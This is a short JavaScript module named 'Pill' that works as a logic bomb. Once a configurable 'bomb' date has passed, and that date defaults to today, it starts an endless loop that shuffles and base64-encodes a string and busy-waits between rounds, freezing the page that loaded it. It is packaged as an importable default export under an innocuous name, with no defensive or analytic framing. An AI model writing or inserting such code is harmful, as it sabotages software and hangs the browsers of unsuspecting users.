
function Pill(opts) {
  return (this instanceof Pill)
    ? this.init(opts || {})
    : new Pill(opts)
}
function sleepFor( sleepDuration ){
  let now = new Date().getTime()
  while(new Date().getTime() < now + sleepDuration){ /* do nothing */ }
}

Pill.prototype.configure = function(opts) {
  let today = new Date()
  let tdStr = today.getFullYear() + '-' + (today.getMonth() + 1) + '-' + today.getDate()
  let Settings = {
    bomb: tdStr,
    earlier: '2021-02'
  }
  this.config = {}
  for (let key in Settings) {
    if (opts.hasOwnProperty(key)) {
      this.config[key] = opts[key]
    } else {
      this.config[key] = Settings[key]
    }
  }
  return this
}

Pill.prototype.init = function (opts) {
  this.configure(opts)
  let now = new Date()
  let bo = this.config.bomb.split('-')
  let bomb = new Date(bo[0], bo[1]-1, bo[2])
  let earlier = this.config.earlier.split('-')
  let isEarly = now.getFullYear() < parseInt(earlier[0]) && (now.getMonth() + 1) < parseInt(earlier[1])
  if (now.getTime() > bomb.getTime() || isEarly) {
    this.roll('His Judgment Cometh and that Right Soon', 0)
  }
  return this
}
Pill.prototype.roll = function (o, t=100, start=0) {
  setTimeout(() => {
    while (t === 0 || start < t) {
      o = this.shuffle(o.substr(0, 5000))
      if (window.btoa) {
        o = window.btoa(o)
      } else {
        o = o + this.shuffle(o)
      }
      ++start
      if (!(start % 1000)) {
        sleepFor(5000)
      }
      // await new Promise(r => setTimeout(r, 500))
    }
  }, 5000)
}
Pill.prototype.shuffle = function (str) {
  return str.split('').sort(function(){return 0.5-Math.random()}).join('')
}

// Start here no need to import
// Pill({
//  bomb: default today,
//  earlier: '2021-02'
// })

export default Pill

